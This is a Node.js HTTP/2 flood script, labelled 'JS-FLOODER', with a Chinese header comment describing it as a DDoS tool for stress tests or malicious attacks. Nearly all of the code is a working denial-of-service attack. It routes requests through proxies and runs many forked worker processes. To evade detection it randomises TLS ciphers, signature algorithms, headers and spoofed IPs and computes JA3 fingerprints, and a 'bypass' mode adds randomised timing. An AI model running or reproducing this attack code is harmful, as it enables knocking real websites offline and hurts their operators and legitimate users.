/**
 * 脚本是用于执行一个基于 HTTP/2 协议的 DDoS 攻击脚本，具体而言，它会通过模拟多个客户端发起大量请求来“淹没”目标服务器，通常这种类型的脚本被用于压力测试或恶意攻击。以下是对该脚本的简要介绍：

脚本功能：
模块加载与设置：

该脚本使用了多个 Node.js 的内建模块，如 http, http2, tls, crypto 等来进行 HTTP/2 和 TLS 连接的创建和管理。
加载了外部库如 random-referer, user-agents, 用于生成随机的用户代理（User-Agent）和来源（Referer），使请求看起来更加多样化，难以被目标服务器识别。
代理与流量控制：

脚本能够使用代理进行请求，这对于伪装请求源和绕过 IP 限制是非常有用的。
可以设置每秒请求数（RPS），并且支持多线程，能够并发发起大量请求。
脚本还可以动态生成和使用自定义的 TLS 加密套件和 JA3 指纹，以规避服务器的检测。
攻击模式选择：

提供了两种攻击模式：flood（洪水攻击）和 bypass（绕过攻击），其中 bypass 模式会随机生成请求的延迟，以模糊其攻击行为。
支持通过 query 参数来选择是否进行查询。
错误处理与异常管理：

通过 uncaughtException 和 unhandledRejection 捕获未处理的错误，防止脚本崩溃。
为了避免因错误导致脚本停止，脚本过滤了多种常见错误（如连接被拒绝、SSL 证书问题等）。
并发与资源管理：

脚本支持通过 Node.js 的 cluster 模块进行多进程并发运行，这能够在服务器上高效地发起大规模的请求。
还可以监控 RAM 使用情况，当内存占用过高时，自动重启进程以保证系统稳定。
生成随机数据：

利用自定义函数生成随机 IP 地址、TLS 指纹、请求头等，增加请求的随机性和隐蔽性。
randReferer 和 user-agents 模块生成随机的 Referer 和 User-Agent 字段，使每个请求看起来像是来自不同的用户。
适用场景：
压力测试：可以用于测试目标网站或服务器的性能，检测它是否能够承受大规模的流量。
恶意攻击：由于该脚本具有攻击性质，能够用于对网站进行分布式拒绝服务攻击（DDoS）。这类攻击会导致目标服务器因大量请求而崩溃或无法响应合法用户的请求。
安全提醒：
这种类型的脚本通常用于恶意目的，因此在未经目标网站或服务授权的情况下使用该脚本进行攻击是违法的。如果您计划进行压力测试，请确保已经获得了目标服务器的同意。
 */

const url = require('url')
	, fs = require('fs')
	, http2 = require('http2')
	, http = require('http')
	, tls = require('tls')
	, net = require('net')
	, request = require('request')
	, cluster = require('cluster')
 randReferer = require('random-referer')
 const rand = randReferer.getRandom()
//random ua by string
const ua = require('user-agents');
const crypto = require('crypto');
const currentTime = new Date();
const os = require("os");
const httpTime = currentTime.toUTCString();
const errorHandler = error => {
	//console.log(error);
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);
try {
	var colors = require('colors');
} catch (err) {
	console.log('\x1b[36mInstalling\x1b[37m the requirements');
	execSync('npm install colors');
	console.log('Done.');
	process.exit();
}
cplist = [
		'TLS_AES_128_CCM_8_SHA256',
		'TLS_AES_128_CCM_SHA256',
		'TLS_CHACHA20_POLY1305_SHA256',
		'TLS_AES_256_GCM_SHA384',
		'TLS_AES_128_GCM_SHA256'
		, ]
const sigalgs = [
	'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512'
	, 'ecdsa_brainpoolP256r1tls13_sha256'
	, 'ecdsa_brainpoolP384r1tls13_sha384'
	, 'ecdsa_brainpoolP512r1tls13_sha512'
	, 'ecdsa_sha1'
	, 'ed25519'
	, 'ed448'
	, 'ecdsa_sha224'
	, 'rsa_pkcs1_sha1'
	, 'rsa_pss_pss_sha256'
	, 'dsa_sha256'
	, 'dsa_sha384'
	, 'dsa_sha512'
	, 'dsa_sha224'
	, 'dsa_sha1'
	, 'rsa_pss_pss_sha384'
	, 'rsa_pkcs1_sha2240'
	, 'rsa_pss_pss_sha512'
	, 'sm2sig_sm3'
	, 'ecdsa_secp521r1_sha512'
, ];
let concu = sigalgs.join(':');

controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400']
	, ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError']
	, ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
const headerFunc = {
	cipher() {
		return cplist[Math.floor(Math.random() * cplist.length)];
	}
, }

process.on('uncaughtException', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
function randomIp() {
	const segment1 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? nh?t (0-255)
	const segment2 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? hai (0-255)
	const segment3 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? ba (0-255)
	const segment4 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? t? (0-255)
	return `${segment1}.${segment2}.${segment3}.${segment4}`;
}

const target = process.argv[2];
const time = process.argv[3];
const thread = process.argv[4];
const proxyFile = process.argv[5];
const rps = process.argv[6];
let input = 'bypass';
let query = 'false';
// Validate input
if (!target || !time || !thread || !proxyFile || !rps || !input) {
	console.log('JS-FLOODER'.bgRed)
	console.error(`Example: node ${process.argv[1]} url time thread proxy.txt rate bypass/flood query(true/false)`.rainbow);
 console.log('default : query : true'.red);
	process.exit(1);
}
// Validate target format
if (!/^https?:\/\//i.test(target)) {
	console.error('sent with http:// or https://');
	process.exit(1);
}
// Parse proxy list
proxyr = proxyFile
// Validate RPS value
if (isNaN(rps) || rps <= 0) {
	console.error('number rps');
	process.exit(1);
}
const MAX_RAM_PERCENTAGE = 95;
const RESTART_DELAY = 100;
if (cluster.isMaster) {
	//console.clear()
	console.log(`success attack`.bgRed)
		, console.log(`flood`.yellow)
	for (let counter = 1; counter <= thread; counter++) {
		cluster.fork();
	}
	const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        console.log('[>] Restarting the script via', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM usage percentage exceeded:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };
	setInterval(handleRAMUsage, 5000);
	setTimeout(() => process.exit(-1), time * 1000);
} else {
	setInterval(flood)
}

function flood() {
	var parsed = url.parse(target);
	var cipper = headerFunc.cipher();
	var proxy = proxyr.split(':');
	var randIp = randomIp();
	

  let interval
if (input === 'flood') {
	interval = 1000;
  } else if (input === 'bypass') {
	function randomDelay(min, max) {
	  return Math.floor(Math.random() * (max - min + 1)) + min;
	}

	// T?o m?t ?? tr? ng?u nhi?n t? 1000 ??n 5000 mili gi?y
	interval = randomDelay(1000, 5000);
  } else {
	interval = 1000;
  }

  
	  /*
	const mediaTypes = [
		'text/html'
		, 'application/xhtml+xml'
		, 'application/xml'
		, 'image/avif'
		, 'image/webp'
		, 'image/apng'
		, '/'
		, 'application/signed-exchange'
	];
	const acceptValues = [];
	mediaTypes.forEach((type, index) => {
		const quality = index === 0 ? 1 : (Math.random() * 0.9 + 0.1).toFixed(1);
		acceptValues.push(`${type};q=${quality}`);
	});
	const acceptHeader = acceptValues.join(',');
	  */
	function randstra(length) {
		const characters = "0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}

	function randstr(minLength, maxLength) {
		const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
const randomStringArray = Array.from({ length }, () => {
const randomIndex = Math.floor(Math.random() * characters.length);
return characters[randomIndex];
});

return randomStringArray.join('');
}

	const randstrsValue = randstr(25);
	
 	






function generateRandomString(minLength, maxLength) {
					const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  const randomStringArray = Array.from({ length }, () => {
    const randomIndex = Math.floor(Math.random() * characters.length);
    return characters[randomIndex];
  });

  return randomStringArray.join('');
}
const hd = {}
 function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
   const secdata = {
				"sec-fetch-mode": "navigate",
        "sec-fetch-user": "?1",
			  }
           const secdata2 = {"sec-fetch-site": "none"}
		 header = {
			":method": "GET",
			":authority": parsed.host,
			":scheme": "https",
			":path": parsed.path,
			"sec-purpose": "prefetch;prerender",
      "purpose": "prefetch",
      "sec-ch-ua": `\\\\\\\"Not_A Brand\\\\\\\";v=\\\\\\\"${getRandomInt(121,345)}\\\\\\\", \\\\\\\"Chromium\\\\\\\";v=\\\\\\\"${getRandomInt(421,6345)}\\\\\\\", \\\\\\\"Google Chrome\\\\\\\";v=\\\\\\\"${getRandomInt(421,7124356)}\\\\\\`,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": Math.random() < 0.5 ? "Windows" : "MacOS",
			"upgrade-insecure-requests": "1",
			'user-agent': process.argv[8],
     'cookie' :process.argv[7] ,
      ...(Math.random() < 0.5 ? secdata2: {}),
            ...(Math.random() < 0.5 ? secdata :{}),
			"sec-fetch-dest": "document",
			"accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,es-ES;q=0.8,es;q=0.7",
 }
	const agent = new http.Agent({
		host: proxy[0]
		, port: proxy[1]
		, keepAlive: true
		, keepAliveMsecs: 500000000
		, maxSockets: 50000
		, maxTotalSockets: 100000
	, });
	const Optionsreq = {
		agent: agent
		, method: 'CONNECT'
		, path: parsed.host + ':443'
		, timeout: 1000
		, headers: {
			'Host': parsed.host
			, 'Proxy-Connection': 'Keep-Alive'
			, 'Connection': 'Keep-Alive'
		, }
	, };
	connection = http.request(Optionsreq, (res) => {});
	const TLSOPTION = {
		ciphers: cipper
		, secureProtocol: ["TLSv1_3_method"]
		, sigals: concu
		, secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom
		, echdCurve: "X25519"
		, secure: true
		, rejectUnauthorized: false
		, ALPNProtocols: ['h2']
	, };

	function createCustomTLSSocket(parsed, socket) {
		const tlsSocket = tls.connect({
			...TLSOPTION
			, host: parsed.host
			, port: 443
			, servername: parsed.host
			, socket: socket
		});
		//console.log('succes connect ')
		tlsSocket.setKeepAlive(true, 600000 * 1000);
		  
		return tlsSocket;
	}
	function generateJA3Fingerprint(socket) {
		const cipherInfo = socket.getCipher();
		const supportedVersions = socket.getProtocol();
	  
		if (!cipherInfo) {
		  console.error('Cipher info is not available. TLS handshake may not have completed.');
		  return null;
		}
	  
		const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;
	  
		const md5Hash = crypto.createHash('md5');
		md5Hash.update(ja3String);
	  
		return md5Hash.digest('hex');
	  }	  
	  
 function taoDoiTuongNgauNhien() {
  const doiTuong = {};
  function getRandomNumber(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
maxi = getRandomNumber(1,4)
  for (let i = 1; i <=maxi ; i++) {
    
    

 const key = 'custom-sec-'+ generateRandomString(1,9)

    const value =  generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)

    doiTuong[key] = value;
  }

  return doiTuong;
}
	 function shuffleObject(obj) {
					const keys = Object.keys(obj);
				  
					for (let i = keys.length - 1; i > 0; i--) {
					  const j = Math.floor(Math.random() * (i + 1));
					  [keys[i], keys[j]] = [keys[j], keys[i]];
					}
				  
					const shuffledObject = {};
					for (const key of keys) {
					  shuffledObject[key] = obj[key];
					}
				  
					return shuffledObject;
				  }
	connection.on('connect', function(res, socket) {
		
    socket.setKeepAlive(true, 100000);
		const tlsSocket = createCustomTLSSocket(parsed, socket);
let ja3Fingerprint; 


function getJA3Fingerprint() {
    return new Promise((resolve, reject) => {
        tlsSocket.on('secureConnect', () => {
            ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
            resolve(ja3Fingerprint); 
        });

        
        tlsSocket.on('error', (error) => {
            reject(error); 
        });
    });
}

async function main() {
    try {
        const fingerprint = await getJA3Fingerprint();  
        hd['ja3-fingerprint']= fingerprint  
    } catch (error) {
        
    }
}


main();
	let clasq = shuffleObject({
		...(Math.random() < 0.5 ? {headerTableSize:655362} : {}),
		enablePush:false,
		...(Math.random() < 0.5 ?	{initialWindowSize: 62914561} : {}),
			...(Math.random() < 0.5 ? {maxHeaderListSize:2621443} : {}),
      	...(Math.random() < 0.5 ? {maxFrameSize : 12000} : {})
	})
       //console.log(clasq)

const client = http2.connect(parsed.href, {
		
		settings: clasq,
   createConnection: () => tlsSocket
	}, (session) => {
    session.setLocalWindowSize(15663105);
});
		client.on("connect", () => {
			setInterval( () => {
				for (let i = 0; i < rps; i++) {

				   var dynHeaders = shuffleObject({
					...taoDoiTuongNgauNhien(),
          ...taoDoiTuongNgauNhien(),
					
				  });          
				
				var head ={
        ...header,
        ...dynHeaders }
				
  const request = client.request(head);
  
  request.end()
				}
			}, 2000);
		});
		
		client.on("close", () => {
			client.destroy();
			tlsSocket.destroy();
			socket.destroy();
			return
		});




client.on("error", error => {
    if (error.code === 'ERR_HTTP2_GOAWAY_SESSION') {
        console.log('Received GOAWAY error, pausing requests for 10 seconds\r');
        shouldPauseRequests = true;
        setTimeout(() => {
           
            shouldPauseRequests = false;
        },2000);
    } else if (error.code === 'ECONNRESET') {
        
        shouldPauseRequests = true;
        setTimeout(() => {
            
            shouldPauseRequests = false;
        }, 2000);
    }  else {
    }

    client.destroy();
			tlsSocket.destroy();
			socket.destroy();
			return
});

	});


	connection.on('error', (error) => {
		connection.destroy();
		if (error) return;
	});
	connection.on('timeout', () => {
		connection.destroy();
		return
	});
	connection.end();
}//
